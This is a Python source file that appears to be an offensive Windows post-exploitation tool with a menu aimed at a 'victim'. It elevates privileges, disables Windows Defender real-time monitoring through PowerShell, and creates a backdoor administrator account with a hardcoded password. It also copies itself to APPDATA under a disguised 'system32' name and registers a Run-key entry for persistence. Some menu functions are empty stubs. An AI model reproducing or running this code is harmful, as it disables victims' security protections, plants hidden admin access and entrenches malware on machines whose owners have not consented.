import os
import shutil
import subprocess
import sys
import winreg
import logging
from elevate import elevate

# Elevate privileges
elevate()

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def check_user_exists(username):
    """Check if a user exists on the system."""
    try:
        subprocess.run(["net", "user", username], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True  # User exists
    except subprocess.CalledProcessError:
        return False  # User does not exist

def check_persistence():
    """Check if persistence is established."""
    app_data = os.getenv("APPDATA")
    persistence_path = os.path.join(app_data, "system32_data.exe")
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        value, _ = winreg.QueryValueEx(key, "systemfilex64")
        if value == persistence_path:
            return True  # Persistence is established
    except FileNotFoundError:
        pass
    return False

def establish_persistence():
    """Establish persistence by adding a registry entry."""
    curr_executable = sys.executable
    app_data = os.getenv("APPDATA")
    to_save_file = os.path.join(app_data, "system32_data.exe")

    if not os.path.exists(to_save_file):
        shutil.copyfile(curr_executable, to_save_file)
        key = winreg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS) as key_obj:
            winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, to_save_file)
        logging.info("Persistence established.")
    else:
        logging.info("Executable already present.")

def add_admin_user(username, password):
    """Add a new user and grant admin privileges."""
    try:
        # Add a new user
        subprocess.run(["net", "user", username, password, "/add"], check=True)
        # Add the user to the Administrators group
        subprocess.run(["net", "localgroup", "Administrators", username, "/add"], check=True)
        logging.info(f"User {username} added as an Administrator.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to add user {username}. Error: {e}")

def get_victim_ip():
    """Get the victim's IP address."""
    try:
        ip = subprocess.run(["ipconfig"], check=True, capture_output=True, text=True)
        logging.info(f"Victim's IP address:\n{ip.stdout}")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to get victim's IP address. Error: {e}")

def hping_victim():
    # Implement function to hping victim
    pass

def check_windows_defender_status():
    """Check the status of Windows Defender on the victim."""
    try:
        subprocess.run(["powershell", "-Command", "Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring"], check=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to check Windows Defender status. Error: {e}")

def disable_windows_defender():
    """Disable Windows Defender on the victim."""
    try:
        subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"], check=True)
        logging.info("Windows Defender disabled on victim.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to disable Windows Defender. Error: {e}")

def enable_windows_defender():
    # Implement function to enable Windows Defender on victim
    pass

def check_admin_user():
    """Check if the admin user exists on the victim."""
    username = "dutchjinn"
    if check_user_exists(username):
        logging.info("Admin present: dutchjinn")
    else:
        logging.info("Admin not present.")

def create_admin_user():
    """Create an admin user on the victim."""
    username = "dutchjinn"
    password = "hackeR888!"
    if not check_user_exists(username):
        add_admin_user(username, password)
    else:
        logging.info("Admin already present.")

def check_persistence_victim():
    # Implement function to check persistence on victim
    pass

def create_persistence_victim():
    # Implement function to create persistence on victim
    pass

def display_menu():
    """Display the main menu."""
    print("Menu:")
    print("1. Get victim's IP")
    print("2. Hping victim")
    print("3. Check Status Windows Defender, $true=disabled - $false=enabled.")
    print("4. Disable Windows Defender on victim")
    print("5. Enable Windows Defender on victim")
    print("6. Check admin user on victim")
    print("7. Create admin user on victim")
    print("8. Check persistence on victim")
    print("9. Create persistence on victim")
    print("0. Exit")

def main():
    # Check if the persistence has already been established
    if check_persistence():
        logging.info("Persistence activated")
    else:
        logging.info("Activating persistence...")

    while True:
        display_menu()
        choice = input("Enter your choice: ")

        if choice == "1":
            get_victim_ip()
        elif choice == "2":
            hping_victim()
        elif choice == "3":
            check_windows_defender_status()
        elif choice == "4":
            disable_windows_defender()
        elif choice == "5":
            enable_windows_defender()
        elif choice == "6":
            check_admin_user()
        elif choice == "7":
            create_admin_user()
        elif choice == "8":
            check_persistence_victim()
        elif choice == "9":
            create_persistence_victim()
        elif choice == "0":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please enter a valid option.")

if __name__ == "__main__":
    main()
